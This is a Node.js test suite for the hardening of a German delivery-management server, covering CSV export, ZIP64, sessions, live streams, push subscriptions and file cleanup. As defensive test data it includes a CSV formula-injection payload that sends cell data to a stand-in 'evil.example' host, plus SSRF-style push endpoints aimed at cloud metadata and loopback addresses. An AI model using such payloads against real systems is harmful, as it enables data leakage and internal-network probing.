// Server hardening (fix round 2): crash safety, ZIP64 + streaming export, CSV injection, sessions/SSE/push
// ending with the access, push allow-list, X-Forwarded-For, invite links, file removal on disk.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import http from 'node:http';
import crypto from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createServer, pushEndpointOk } from '../server/index.js';
import { csvCell, toCsv } from '../core/csv.js';
import { createZip, crc32 } from '../core/zip.js';
import { totp } from '../core/totp.js';
import { PLANS } from '../core/engine.js';
import { sendPush, generateVapidKeys } from '../server/webpush.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const JPEG = Buffer.from('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=', 'base64');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const until = async (fn, ms = 3000) => { const t = Date.now(); while (Date.now() - t < ms) { if (await fn()) return true; await sleep(20); } return false; };
const ua = crypto.createECDH('prime256v1'); ua.generateKeys();
const KEYS = { p256dh: ua.getPublicKey().toString('base64url'), auth: crypto.randomBytes(16).toString('base64url') };

async function boot(opts = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ladeklar-hard-'));
  const pushed = [];
  const s = createServer({ dataDir: dir, quiet: true, platformEmail: 'chef@ladeklar.de', platformPassword: 'plattform-pass-1', sendPush: async (sub, payload) => { pushed.push({ sub, payload }); return { ok: true, status: 201 }; }, ...opts });
  const port = await s.listen(0, '127.0.0.1');
  const base = `http://127.0.0.1:${port}`;
  const client = (hdrs = {}) => {
    let cookie = '';
    const req = async (method, p, body, headers = {}) => {
      const isBuf = Buffer.isBuffer(body);
      const r = await fetch(base + p, { method, headers: { 'X-Ladeklar': '1', ...hdrs, ...(cookie ? { Cookie: cookie } : {}), ...(body && !isBuf ? { 'Content-Type': 'application/json' } : {}), ...headers }, body: body ? (isBuf ? body : JSON.stringify(body)) : undefined });
      const sc = r.headers.get('set-cookie');
      if (sc) cookie = sc.split(';')[0];
      const ct = r.headers.get('content-type') || '';
      return { status: r.status, data: ct.includes('json') ? await r.json() : Buffer.from(await r.arrayBuffer()), headers: r.headers };
    };
    return {
      req, call: (m, a = {}) => req('POST', '/api/call/' + m, a), get cookie() { return cookie; },
      login: (email, password, code) => req('POST', '/api/auth/login', { email, password, code }),
      driver: (code, phone, pin) => req('POST', '/api/auth/driver', { code, phone, pin }),
      upload: (q = 'kind=other', buf = JPEG) => req('POST', '/api/files?' + q, buf, { 'Content-Type': 'image/jpeg' }),
    };
  };
  const lic = client();
  await lic.login('chef@ladeklar.de', 'plattform-pass-1');
  /** a company with its admin signed in (own password) */
  const company = async (code, plan = 'flotte') => {
    const r = await lic.call('createTenant', { name: code + ' GmbH', code, plan, adminEmail: `admin@${code.toLowerCase()}.de`, adminPassword: 'admin-passwort-1' });
    assert.equal(r.status, 200, JSON.stringify(r.data));
    const admin = client();
    assert.equal((await admin.login(`admin@${code.toLowerCase()}.de`, 'admin-passwort-1')).status, 200);
    return { tenant: r.data.tenant, admin };
  };
  const driver = async (admin, code, name, phone) => {
    const r = await admin.call('createUser', { role: 'driver', name, phone });
    const c = client();
    assert.equal((await c.driver(code, phone, r.data.pin)).status, 200);
    return { ...r.data, c };
  };
  return { s, dir, port, base, client, lic, company, driver, pushed, stop: async () => { await s.close(); fs.rmSync(dir, { recursive: true, force: true }); } };
}

function sseListen(base, cookie) {
  const events = [];
  let status = null, ended = false;
  const ctrl = new AbortController();
  const done = fetch(base + '/api/events', { headers: { Cookie: cookie }, signal: ctrl.signal }).then(async (r) => {
    status = r.status;
    const reader = r.body.getReader(); const dec = new TextDecoder(); let buf = '';
    for (;;) {
      const { value, done: end } = await reader.read(); if (end) break;
      buf += dec.decode(value, { stream: true });
      let i;
      while ((i = buf.indexOf('\n\n')) >= 0) {
        const chunk = buf.slice(0, i); buf = buf.slice(i + 2);
        const ev = /event: (\w+)/.exec(chunk)?.[1]; const data = /data: (.*)/.exec(chunk)?.[1];
        if (ev) events.push({ ev, data: data ? JSON.parse(data) : null });
      }
    }
  }).catch(() => {}).finally(() => { ended = true; });
  return {
    events, get status() { return status; }, get ended() { return ended; },
    has: (pred) => events.some(pred),
    ready: () => until(() => events.some((e) => e.ev === 'hello') || ended),
    stop: () => { ctrl.abort(); return done; },
  };
}
const rawHttp = (port, text) => new Promise((resolve) => {
  const c = net.connect(port, '127.0.0.1', () => c.write(text));
  let b = ''; c.on('data', (d) => { b += d; }); c.on('close', () => resolve(b)); c.on('error', () => resolve(b));
});
const getHost = (port, p, host) => new Promise((resolve, reject) => {
  http.get({ host: '127.0.0.1', port, path: p, headers: { Host: host } }, (r) => { let b = ''; r.on('data', (d) => { b += d; }); r.on('end', () => resolve(b)); }).on('error', reject);
});

// ---------------------------------------------------------------------------------------------
test('csv: cells starting with = + - @ tab CR are neutralised, numbers stay, quoting works', () => {
  assert.equal(csvCell('=1+1'), "'=1+1");
  assert.equal(csvCell('+49 176 1'), "'+49 176 1");
  assert.equal(csvCell('-2+3'), "'-2+3");
  assert.equal(csvCell('@SUM(A1)'), "'@SUM(A1)");
  assert.equal(csvCell('\tx'), "'\tx");
  assert.equal(csvCell('\rx'), '"\'\rx"');
  assert.equal(csvCell('=HYPERLINK("https://evil.example";"x")'), '"\'=HYPERLINK(""https://evil.example"";""x"")"');
  assert.equal(csvCell(-5), '-5');
  assert.equal(csvCell(12.5), '12.5');
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(undefined), '');
  assert.equal(csvCell('Müller; Söhne'), '"Müller; Söhne"');
  assert.equal(csvCell('Zeile 1\nZeile 2'), '"Zeile 1\nZeile 2"');
  assert.deepEqual(['10', 'a1', 'x'].map(csvCell), ['10', 'a1', 'x'], 'safe as a map callback');
  assert.equal(toCsv([['Kunde', 'Paletten'], ['=Bosch', 3], []]), "Kunde;Paletten\r\n'=Bosch;3\r\n");
  assert.equal(toCsv([['a,b', 'c;d']], ','), '"a,b",c;d');
});

// a small ZIP reader that understands ZIP64 (central directory, extra field 1, end records)
function readZip(readAt, total) {
  const eocd = readAt(total - 22, 22);
  assert.equal(eocd.readUInt32LE(0), 0x06054b50, 'end of central directory');
  let count = eocd.readUInt16LE(10), cdSize = eocd.readUInt32LE(12), cdAt = eocd.readUInt32LE(16), zip64 = false;
  if (count === 0xffff || cdSize === 0xffffffff || cdAt === 0xffffffff) {
    const loc = readAt(total - 42, 20);
    assert.equal(loc.readUInt32LE(0), 0x07064b50, 'zip64 locator');
    const rec = readAt(Number(loc.readBigUInt64LE(8)), 56);
    assert.equal(rec.readUInt32LE(0), 0x06064b50, 'zip64 end record');
    count = Number(rec.readBigUInt64LE(32)); cdSize = Number(rec.readBigUInt64LE(40)); cdAt = Number(rec.readBigUInt64LE(48)); zip64 = true;
  }
  const cd = readAt(cdAt, cdSize);
  const entries = [];
  for (let p = 0; entries.length < count;) {
    assert.equal(cd.readUInt32LE(p), 0x02014b50);
    const nl = cd.readUInt16LE(p + 28), xl = cd.readUInt16LE(p + 30), cl = cd.readUInt16LE(p + 32);
    let size = cd.readUInt32LE(p + 24), at = cd.readUInt32LE(p + 42);
    for (let x = p + 46 + nl; x < p + 46 + nl + xl; x += 4 + cd.readUInt16LE(x + 2)) {
      if (cd.readUInt16LE(x) !== 1) continue;
      let q = x + 4;
      if (size === 0xffffffff) { size = Number(cd.readBigUInt64LE(q)); q += 16; }
      if (at === 0xffffffff) at = Number(cd.readBigUInt64LE(q));
    }
    entries.push({ name: cd.toString('utf8', p + 46, p + 46 + nl), size, at, crc: cd.readUInt32LE(p + 16), version: cd.readUInt16LE(p + 6) });
    p += 46 + nl + xl + cl;
  }
  const local = (e) => { const h = readAt(e.at, 30); assert.equal(h.readUInt32LE(0), 0x04034b50, 'local header at ' + e.at); return h; };
  const data = (e) => { const h = local(e); return readAt(e.at + 30 + h.readUInt16LE(26) + h.readUInt16LE(28), e.size); };
  return { zip64, entries, local, data };
}

test('zip: classic below the limits, ZIP64 above 65,535 entries and above 4 GiB offsets', () => {
  // small archive: no ZIP64 records
  const parts = [];
  const z = createZip((c) => parts.push(Buffer.from(c)));
  z.add('a.txt', 'hallo', 0); z.add('a.txt', 'zweites', 0);
  const size = z.end();
  const all = Buffer.concat(parts);
  assert.equal(size, all.length, 'end() returns the size');
  const zs = readZip((at, n) => all.subarray(at, at + n), all.length);
  assert.equal(zs.zip64, false);
  assert.deepEqual(zs.entries.map((e) => e.name), ['a.txt', 'a-2.txt']);
  assert.equal(zs.data(zs.entries[1]).toString(), 'zweites');

  // 70,000 entries: the 16-bit count overflows → ZIP64 end record carries the real count
  const parts2 = [];
  const z2 = createZip((c) => parts2.push(Buffer.from(c)));
  for (let i = 0; i < 70000; i++) z2.add(`dateien/pod/f${i}.jpg`, `n${i}`, 0);
  z2.end();
  const big = Buffer.concat(parts2);
  const zb = readZip((at, n) => big.subarray(at, at + n), big.length);
  assert.equal(zb.zip64, true);
  assert.equal(zb.entries.length, 70000);
  assert.equal(zb.data(zb.entries[69999]).toString(), 'n69999');
  assert.equal(zb.entries[69999].crc, crc32(Buffer.from('n69999')));

  // entries beyond 4 GiB (sparse file: the archive starts after a 4 GiB hole)
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'ladeklar-zip64-')), 'big.zip');
  const fd = fs.openSync(file, 'w+');
  try {
    const startAt = 2 ** 32 + 1000;
    let pos = startAt;
    const z3 = createZip((c) => { fs.writeSync(fd, c, 0, c.length, pos); pos += c.length; }, { offset: startAt });
    z3.add('lieferungen.csv', 'Buchungsnummer;Status', 0);
    z3.add('daten.json', '{"ok":true}', 0);
    const total = z3.end();
    assert.equal(total, pos);
    const readAt = (at, n) => { const b = Buffer.alloc(n); fs.readSync(fd, b, 0, n, at); return b; };
    const z4 = readZip(readAt, total);
    assert.equal(z4.zip64, true);
    assert.ok(z4.entries.every((e) => e.at >= 2 ** 32), 'offsets above 4 GiB');
    assert.ok(z4.entries.every((e) => e.version === 45), 'version needed 4.5');
    assert.equal(z4.local(z4.entries[0]).readUInt16LE(4), 45);
    assert.equal(z4.data(z4.entries[1]).toString(), '{"ok":true}');
  } finally { fs.closeSync(fd); fs.rmSync(path.dirname(file), { recursive: true, force: true }); }
});

test('no request takes the process down: start password CSV, errors while streaming, broken URLs', async () => {
  const { s, port, base, client, company, stop } = await boot();
  try {
    const { admin } = await company('KAYA');
    // sec-1: a start password used to crash the server through deliveries.csv
    const dsp = await admin.call('createUser', { role: 'dispatcher', name: 'Neu Disp', email: 'neu@kaya.de' });
    const fresh = client();
    assert.equal((await fresh.login('neu@kaya.de', dsp.data.password)).status, 200);
    const csv = await fresh.req('GET', '/api/export/deliveries.csv');
    assert.equal(csv.status, 403);
    assert.equal(csv.data.error.code, 'password_change');
    assert.equal((await client().req('GET', '/api/health')).status, 200);

    // an error after the ZIP headers went out cuts the connection only
    assert.equal((await admin.upload()).status, 200);
    const get = s.sql.store.get;
    s.sql.store.get = (col, id) => { if (col === 'files') throw new Error('Platte weg'); return get.call(s.sql.store, col, id); };
    const out = await fetch(base + '/api/export/all.zip', { headers: { Cookie: admin.cookie } }).then((r) => r.arrayBuffer()).then(() => 'complete', () => 'cut');
    s.sql.store.get = get;
    assert.equal(out, 'cut');
    assert.equal((await client().req('GET', '/api/health')).status, 200);

    // an error that escapes the route's own error handling still becomes a 500
    const call = s.engine.call;
    s.engine.call = (u, name, ...rest) => { if (name === 'me') throw { get stack() { throw new Error('kaputt'); } }; return call(u, name, ...rest); };
    const r500 = await admin.req('GET', '/api/session');
    s.engine.call = call;
    assert.equal(r500.status, 500);
    assert.equal(r500.data.error.code, 'server');

    // a request line the parser accepts but URL() refuses
    assert.match(await rawHttp(port, 'GET //[ HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n'), /^HTTP\/1\.1 400/);
    assert.equal((await admin.req('GET', '/api/session')).status, 200);
  } finally { await stop(); }
});

test('export: CSV without the 1000-row cap and neutralised, ZIP streams with lieferungen.csv, every download audited', async () => {
  const { s, base, company, driver, lic, stop } = await boot();
  try {
    const { tenant, admin } = await company('NORD');
    const actor = s.engine.auth.actor(s.sql.store.find('users', { tenantId: tenant.id, role: 'admin' })[0].id);
    const day = new Date().toISOString().slice(0, 10);
    s.sql.store.tx(() => { for (let i = 0; i < 1005; i++) s.engine.call(actor, 'createDelivery', { customer: 'K' + i, pickup: { city: 'Hamburg', date: day }, dropoff: { city: 'Kiel' } }); });
    const drv = await driver(admin, 'NORD', 'Sven Krause', '0176 1000 0004');
    const d = await admin.call('createDelivery', { customer: '=HYPERLINK("https://evil.example/?x="&A1;"Rechnung")', reference: '+1+cmd', pickup: { city: '@SUM(1+1)', date: day }, dropoff: { city: '-2+3' }, goods: { text: '=1+1', pallets: 3 }, driverId: drv.user.id });
    assert.equal(d.status, 200);
    const csv = (await admin.req('GET', '/api/export/deliveries.csv')).data.toString();
    assert.ok(csv.startsWith('﻿Buchungsnummer;'));
    assert.equal(csv.split('\r\n').filter((l) => /^[A-Z]+-\d{4}-\d{4};/.test(l)).length, 1006, 'all deliveries');
    const row = csv.split('\r\n').find((l) => l.startsWith(d.data.bookingNo));
    assert.match(row, /;"'=HYPERLINK\(""https:\/\/evil\.example\/\?x=""&A1;""Rechnung""\)";'\+1\+cmd;'@SUM\(1\+1\) → -2\+3;'@SUM\(1\+1\);/);
    assert.match(row, /;'=1\+1;3;/, 'numbers stay as they are');

    // ZIP: complete, with the full CSV inside
    assert.equal((await drv.c.upload(`kind=load&deliveryId=${d.data.id}`)).status, 200);
    const zr = await fetch(base + '/api/export/all.zip', { headers: { Cookie: admin.cookie } });
    const zip = Buffer.from(await zr.arrayBuffer());
    const z = readZip((at, n) => zip.subarray(at, at + n), zip.length);
    const names = z.entries.map((e) => e.name);
    assert.ok(names.includes('lieferungen.csv') && names.includes('daten.json') && names.includes('LIESMICH.txt'));
    assert.ok(names.some((n) => n.startsWith('dateien/load/')));
    const inner = z.data(z.entries.find((e) => e.name === 'lieferungen.csv')).toString();
    assert.equal(inner.split('\r\n').length, 1007, 'header + 1006 rows');
    for (const e of z.entries) assert.equal(crc32(z.data(e)), e.crc, e.name);
    assert.equal((await admin.req('GET', '/api/export/all.json')).status, 200);
    // billing.csv of the licensor is neutralised, too
    await admin.call('updateCompany', { legalName: '=HYPERLINK("https://evil.example";"Zahlung")' });
    const bill = (await lic.req('GET', '/api/export/billing.csv')).data.toString();
    assert.ok(!/;"?=HYPERLINK/.test(bill), 'no live formula in billing.csv');

    const kinds = s.sql.store.find('audit', { tenantId: tenant.id }).map((e) => e.action).filter((a) => a.startsWith('export.'));
    assert.deepEqual(kinds.sort(), ['export.csv', 'export.json', 'export.zip']);
  } finally { await stop(); }
});

test('ZIP export reads one file at a time, waits for the client and stops when it goes away', async () => {
  const { s, dir, port, company, stop } = await boot();
  try {
    const { tenant, admin } = await company('KAYA', 'premium');
    const actor = s.engine.auth.actor(s.sql.store.find('users', { tenantId: tenant.id, role: 'admin' })[0].id);
    const MB = Buffer.alloc(1 << 20, 0x41); JPEG.copy(MB);
    fs.mkdirSync(path.join(dir, 'files', tenant.id), { recursive: true });
    for (let i = 0; i < 40; i++) {
      const f = s.engine.call(actor, 'createFile', { kind: 'other', mime: 'image/jpeg', size: MB.length, name: `f${i}.jpg` });
      fs.writeFileSync(path.join(dir, 'files', f.tenantId, f.id + '.bin'), MB);
    }
    let reads = 0;
    const get = s.sql.store.get;
    s.sql.store.get = (col, id) => { if (col === 'files') reads++; return get.call(s.sql.store, col, id); };
    // a client that never reads: the server must stop after the socket buffers are full
    const req = http.get({ host: '127.0.0.1', port, path: '/api/export/all.zip', headers: { Cookie: admin.cookie } });
    const res = await new Promise((r) => req.on('response', r));
    assert.equal(res.statusCode, 200);
    res.pause();
    await sleep(400);
    const stalled = reads;
    assert.ok(stalled < 40, `waits for the client (read ${stalled} of 40 files)`);
    // meanwhile the server answers other requests
    assert.equal((await fetch(`http://127.0.0.1:${port}/api/health`)).status, 200);
    req.destroy();
    await sleep(300);
    const after = reads;
    await sleep(300);
    assert.equal(reads, after, 'no more reads after the client left');
    assert.ok(after < 40);
    s.sql.store.get = get;
  } finally { await stop(); }
});

test('start password: no files, live stream, push or uploads until the own password is set', async () => {
  const { base, client, company, stop } = await boot();
  try {
    const { admin } = await company('KAYA');
    const up = await admin.upload();
    const logo = await admin.upload('kind=logo');
    const dsp = await admin.call('createUser', { role: 'dispatcher', name: 'Jonas Weber', email: 'jonas@kaya.de' });
    const j = client();
    assert.equal((await j.login('jonas@kaya.de', dsp.data.password)).status, 200);
    assert.equal((await j.req('GET', '/api/files/' + up.data.id)).status, 404);
    assert.equal((await j.req('GET', '/api/files/' + logo.data.id)).status, 200, 'logos stay public');
    assert.equal((await j.req('POST', '/api/push/subscribe', { endpoint: 'https://fcm.googleapis.com/fcm/send/j1', keys: KEYS })).data.error.code, 'password_change');
    assert.equal((await j.upload()).status, 403);
    const st = sseListen(base, j.cookie); await st.ready();
    assert.equal(st.status, 403);
    await st.stop();
    assert.equal((await j.req('GET', '/api/export/all.json')).status, 403);
    assert.equal((await j.req('GET', '/api/session')).status, 200);
    assert.equal((await j.call('changePassword', { current: dsp.data.password, next: 'jonas-passwort-1' })).status, 200);
    assert.equal((await j.req('GET', '/api/files/' + up.data.id)).status, 200);
    assert.equal((await j.req('POST', '/api/auth/logout')).status, 200);
  } finally { await stop(); }
});

test('sessions, push subscriptions and live streams end with the access (C6, C7)', async () => {
  const { s, base, client, lic, company, driver, stop } = await boot();
  try {
    const { tenant, admin } = await company('KAYA');
    const adminId = s.sql.store.find('users', { tenantId: tenant.id, role: 'admin' })[0].id;
    // changePassword: the other device is signed out, this one stays; all push subscriptions go
    const second = client();
    await second.login('admin@kaya.de', 'admin-passwort-1');
    await admin.req('POST', '/api/push/subscribe', { endpoint: 'https://fcm.googleapis.com/fcm/send/a1', keys: KEYS });
    await second.req('POST', '/api/push/subscribe', { endpoint: 'https://web.push.apple.com/a2', keys: KEYS });
    const sMine = sseListen(base, admin.cookie), sOther = sseListen(base, second.cookie);
    await sMine.ready(); await sOther.ready();
    assert.equal((await admin.call('changePassword', { current: 'admin-passwort-1', next: 'admin-passwort-2' })).status, 200);
    assert.equal((await second.req('GET', '/api/session')).status, 401);
    assert.equal((await admin.req('GET', '/api/session')).status, 200);
    assert.equal(s.sql.push.forUser.all(adminId).length, 0);
    assert.ok(await until(() => sOther.ended), 'the other stream is closed');
    await admin.call('createDelivery', { customer: 'X', pickup: { city: 'Ulm', date: '2026-10-20' }, dropoff: { city: 'Köln' } });
    assert.ok(await until(() => sMine.has((e) => e.ev === 'change' && e.data.col === 'deliveries')), 'this stream lives on');
    assert.equal(sMine.ended, false);
    await sMine.stop();

    // resetSecret (lost phone): session, push and stream of the driver end
    const sven = await driver(admin, 'KAYA', 'Sven Krause', '0176 1000 0004');
    await sven.c.req('POST', '/api/push/subscribe', { endpoint: 'https://fcm.googleapis.com/fcm/send/lost-phone', keys: KEYS });
    const sv = sseListen(base, sven.c.cookie); await sv.ready();
    const reset = await admin.call('resetSecret', { id: sven.user.id });
    assert.equal(reset.status, 200);
    assert.equal((await sven.c.req('GET', '/api/session')).status, 401);
    assert.equal(s.sql.push.forUser.all(sven.user.id).length, 0);
    assert.ok(await until(() => sv.ended));

    // setUserActive(false) and deleteUser
    const piotr = await driver(admin, 'KAYA', 'Piotr Nowak', '0176 1000 0002');
    await piotr.c.req('POST', '/api/push/subscribe', { endpoint: 'https://fcm.googleapis.com/fcm/send/piotr', keys: KEYS });
    const sp = sseListen(base, piotr.c.cookie); await sp.ready();
    await admin.call('setUserActive', { id: piotr.user.id, active: false });
    assert.ok(await until(() => sp.ended));
    assert.equal(s.sql.push.forUser.all(piotr.user.id).length, 0);
    const olena = await driver(admin, 'KAYA', 'Olena Bondar', '0176 1000 0005');
    const so = sseListen(base, olena.c.cookie); await so.ready();
    await admin.call('deleteUser', { id: olena.user.id });
    assert.ok(await until(() => so.ended));

    // logout closes the stream of that session
    const dmitri = await driver(admin, 'KAYA', 'Dmitri Volkov', '0176 1000 0006');
    const sd = sseListen(base, dmitri.c.cookie); await sd.ready();
    await dmitri.c.req('POST', '/api/auth/logout');
    assert.ok(await until(() => sd.ended));

    // licence: a suspended company's drivers lose the stream at once, a cancelled one's office too
    const andrei = await driver(admin, 'KAYA', 'Andrei Popescu', '0176 1000 0007');
    assert.equal((await admin.call('createUser', { role: 'dispatcher', name: 'Jonas Weber', email: 'jonas@kaya.de', password: 'jonas-passwort-1' })).status, 200);
    const jonas = client(); await jonas.login('jonas@kaya.de', 'jonas-passwort-1');
    const sa = sseListen(base, andrei.c.cookie), sAdm = sseListen(base, admin.cookie), sj = sseListen(base, jonas.cookie);
    await sa.ready(); await sAdm.ready(); await sj.ready();
    await lic.call('updateTenantLicense', { id: tenant.id, status: 'suspended' });
    assert.ok(await until(() => sa.ended), 'driver stream closed on suspension');
    assert.equal(sAdm.ended, false);
    assert.equal(sj.ended, false, 'the office may still look and export');
    await lic.call('updateTenantLicense', { id: tenant.id, status: 'cancelled' });
    assert.ok(await until(() => sj.ended), 'dispatcher stream closed on cancellation');
    assert.equal(sAdm.ended, false, 'the admin keeps read access');
    await sAdm.stop();

    // resetTenantAdmin by the licensor
    const sAdm2 = sseListen(base, admin.cookie); await sAdm2.ready();
    await admin.req('POST', '/api/push/subscribe', { endpoint: 'https://fcm.googleapis.com/fcm/send/a3', keys: KEYS });
    assert.equal((await lic.call('resetTenantAdmin', { id: tenant.id })).status, 200);
    assert.equal((await admin.req('GET', '/api/session')).status, 401);
    assert.equal(s.sql.push.forUser.all(adminId).length, 0);
    assert.ok(await until(() => sAdm2.ended));
  } finally { await stop(); }
});

test('live events: company events to that company, every event to the licensor (C5)', async () => {
  const { base, lic, company, driver, stop } = await boot();
  try {
    const a = await company('KAYA'), b = await company('ALPEN');
    const drv = await driver(a.admin, 'KAYA', 'Sven Krause', '0176 1000 0004');
    const sLic = sseListen(base, lic.cookie), sA = sseListen(base, a.admin.cookie), sB = sseListen(base, b.admin.cookie), sD = sseListen(base, drv.c.cookie);
    await Promise.all([sLic.ready(), sA.ready(), sB.ready(), sD.ready()]);
    const d = await a.admin.call('createDelivery', { customer: 'X', pickup: { city: 'Ulm', date: '2026-10-20' }, dropoff: { city: 'Köln' }, openForAll: false });
    await a.admin.call('updateCompany', { settings: { requirePod: false } });
    const isDel = (e) => e.ev === 'change' && e.data.col === 'deliveries' && e.data.id === d.data.id;
    const isTen = (e) => e.ev === 'change' && e.data.col === 'tenants' && e.data.id === a.tenant.id;
    assert.ok(await until(() => sLic.has(isDel) && sLic.has(isTen)), 'licensor gets every change');
    assert.ok(await until(() => sA.has(isDel) && sA.has(isTen)));
    assert.ok(await until(() => sD.has(isTen)), 'the company\'s drivers get its settings change');
    await sleep(100);
    assert.ok(!sB.has(isDel) && !sB.has(isTen), 'another company gets nothing');
    assert.ok(!sD.has(isDel), 'a delivery not offered to the driver stays hidden');
    for (const x of [sLic, sA, sB, sD]) await x.stop();
  } finally { await stop(); }
});

test('push subscribe: only real push services, at most 10 per person, unsubscribe only own', async () => {
  for (const ok of ['https://fcm.googleapis.com/fcm/send/x', 'https://web.push.apple.com/QAbc', 'https://api.push.apple.com/x', 'https://updates.push.services.mozilla.com/wpush/v2/x', 'https://push.services.mozilla.com/x', 'https://wns2-par02p.notify.windows.com/w/?token=x', 'https://fcm.googleapis.com:443/x']) assert.ok(pushEndpointOk(ok), ok);
  for (const bad of ['http://fcm.googleapis.com/x', 'https://127.0.0.1/x', 'https://169.254.169.254/latest/meta-data/', 'https://fcm.googleapis.com:8443/x', 'https://fcm.googleapis.com.evil.example/x', 'https://evil.example/#@fcm.googleapis.com', 'https://user@fcm.googleapis.com/x', 'https://push.apple.com/x', 'https://notify.windows.com/x', 'https://[::1]/x', null, 42]) assert.ok(!pushEndpointOk(bad), String(bad));
  const { s, company, driver, pushed, stop } = await boot();
  try {
    const { admin } = await company('KAYA');
    const sven = await driver(admin, 'KAYA', 'Sven Krause', '0176 1000 0004');
    assert.equal((await sven.c.req('POST', '/api/push/subscribe', { endpoint: 'https://169.254.169.254/latest/meta-data/', keys: KEYS })).status, 400);
    for (let i = 0; i < 12; i++) {
      assert.equal((await sven.c.req('POST', '/api/push/subscribe', { endpoint: `https://fcm.googleapis.com/fcm/send/dev${i}`, keys: KEYS })).status, 200);
      await sleep(2);
    }
    const rows = s.sql.push.forUser.all(sven.user.id).map((r) => r.endpoint);
    assert.equal(rows.length, 10);
    assert.ok(!rows.includes('https://fcm.googleapis.com/fcm/send/dev0') && !rows.includes('https://fcm.googleapis.com/fcm/send/dev1'), 'the oldest went');
    // someone else cannot remove Sven's subscription
    await admin.req('POST', '/api/push/unsubscribe', { endpoint: 'https://fcm.googleapis.com/fcm/send/dev5' });
    assert.equal(s.sql.push.forUser.all(sven.user.id).length, 10);
    await sven.c.req('POST', '/api/push/unsubscribe', { endpoint: 'https://fcm.googleapis.com/fcm/send/dev5' });
    assert.equal(s.sql.push.forUser.all(sven.user.id).length, 9);
    pushed.length = 0;
    await admin.call('createDelivery', { customer: 'X', pickup: { city: 'Ulm', date: '2026-10-20' }, dropoff: { city: 'Köln' }, driverId: sven.user.id });
    assert.ok(await until(() => pushed.length === 9), 'one push per remaining device');
  } finally { await stop(); }
});

test('web push: no redirects and a time limit for the push service', async () => {
  let seen;
  const r = await sendPush({ endpoint: 'https://fcm.googleapis.com/fcm/send/x', keys: KEYS }, { title: 'T' }, { keys: generateVapidKeys(), subject: 'mailto:a@b.de', fetchImpl: async (u, o) => { seen = o; return { status: 201 }; } });
  assert.equal(r.ok, true);
  assert.equal(seen.redirect, 'error');
  assert.ok(seen.signal instanceof AbortSignal);
});

test('X-Forwarded-For behind a proxy: the address the proxy added counts (TRUST_PROXY_HOPS)', async () => {
  const one = await boot({ trustProxy: true });
  try {
    let n429 = 0;
    for (let i = 0; i < 25; i++) if ((await one.client({ 'X-Forwarded-For': `10.0.${i}.1, 203.0.113.7` }).login('x' + i + '@x.de', 'falsch-falsch')).status === 429) n429++;
    assert.equal(n429, 5, 'spoofed left entries do not bypass the limit');
    await one.client({ 'X-Forwarded-For': '1.2.3.4, 198.51.100.9' }).login('chef@ladeklar.de', 'falsch-falsch');
    const e = one.s.sql.store.find('audit', {}).filter((x) => x.action === 'login.failed').sort((a, b) => b.at - a.at)[0];
    assert.equal(e.ip, '198.51.100.9');
  } finally { await one.stop(); }
  const two = await boot({ trustProxy: true, trustProxyHops: 2 });
  try {
    await two.client({ 'X-Forwarded-For': '1.2.3.4, 198.51.100.9, 10.0.0.2' }).login('chef@ladeklar.de', 'falsch-falsch');
    const e = two.s.sql.store.find('audit', {}).filter((x) => x.action === 'login.failed').sort((a, b) => b.at - a.at)[0];
    assert.equal(e.ip, '198.51.100.9');
  } finally { await two.stop(); }
});

test('files: removed documents and expired orphans leave the disk, stray bytes are swept, quota and upload rate', async () => {
  let T = Date.parse('2026-10-16T08:00:00Z');
  const { s, dir, port, company, driver, stop } = await boot({ now: () => T });
  try {
    const { tenant, admin } = await company('KAYA');
    const tdir = path.join(dir, 'files', tenant.id);
    const sven = await driver(admin, 'KAYA', 'Sven Krause', '0176 1000 0004');
    const d = await admin.call('createDelivery', { customer: 'X', pickup: { city: 'Ulm', date: '2026-10-16' }, dropoff: { city: 'Köln' }, driverId: sven.user.id });
    const up = await sven.c.upload(`kind=load&deliveryId=${d.data.id}`);
    assert.equal(up.status, 200);
    const bin = path.join(tdir, up.data.id + '.bin');
    assert.ok(fs.existsSync(bin));
    assert.equal((await sven.c.call('removeDoc', { id: d.data.id, fileId: up.data.id })).status, 200);
    assert.ok(await until(() => !fs.existsSync(bin)), 'removeDoc deletes the bytes (C10)');

    // an orphan upload is purged after 24 h by the maintenance run
    const orphan = await sven.c.upload('kind=other');
    const obin = path.join(tdir, orphan.data.id + '.bin');
    const keep = await admin.upload(`kind=pod&deliveryId=${d.data.id}`);
    const stray = path.join(tdir, 'strayStray1234.bin'), fresh = path.join(tdir, 'freshFresh1234.bin'), part = path.join(tdir, 'leftOver1234.part');
    for (const f of [stray, fresh, part]) fs.writeFileSync(f, 'x');
    const old = new Date(Date.now() - 2 * 3600e3);
    fs.utimesSync(stray, old, old); fs.utimesSync(part, old, old);
    T += 25 * 3600e3;
    await s.maintenance();
    assert.ok(await until(() => !fs.existsSync(obin)), 'orphan purged');
    assert.ok(fs.existsSync(path.join(tdir, keep.data.id + '.bin')), 'attached file stays');
    assert.ok(!fs.existsSync(stray) && !fs.existsSync(part), 'stray bytes and old upload leftovers swept');
    assert.ok(fs.existsSync(fresh), 'a fresh unknown file is left alone (could be an upload in progress)');

    // storage full: 413 with the engine's message, nothing left on disk
    const t = s.sql.store.get('tenants', tenant.id);
    s.sql.store.put('tenants', { ...t, storageUsed: PLANS.flotte.storageGB * 2 ** 30 - 10 });
    const before = fs.readdirSync(tdir).length;
    const full = await admin.upload();
    assert.equal(full.status, 413);
    assert.equal(full.data.error.code, 'quota');
    assert.equal(fs.readdirSync(tdir).length, before, 'no bytes kept for a refused upload');
    s.sql.store.put('tenants', { ...s.sql.store.get('tenants', tenant.id), storageUsed: 0 });
    // upload rate per person
    let last;
    for (let i = 0; i < 31; i++) last = await sven.c.upload('kind=other');
    assert.equal(last.status, 429);
    assert.equal(last.data.error.message, 'Zu viele Uploads. Bitte eine Minute warten.');
    // a body announced larger than 15 MB is refused before it is read
